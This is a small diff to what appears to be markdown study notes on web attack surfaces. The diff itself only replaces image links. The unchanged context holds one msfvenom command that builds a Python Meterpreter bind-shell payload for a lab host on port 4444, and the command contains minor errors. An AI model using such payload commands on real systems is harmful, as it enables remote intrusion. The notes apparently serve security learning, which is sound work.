@@ -63,7 +63,11 @@ Web-based attack surfaces include web application interfaces, authentication mec
 
 - To generate a payload that triggers a TCP bind shell on executiion on host 10.10.10.30(Python Server), use this bash command: "msfvenom -p python/meterpreter/bind-tcp LHOST=10.10.10.30 LPORT=4444 -e base64"
 
-![web attack surfaces](Images/was1.png)
+![web attack surfaces](Images/was1.1.png)
+
+
+![web attack surfaces](Images/was1.2.png)
+
 
 ![web attack](Images/was2.png)
   
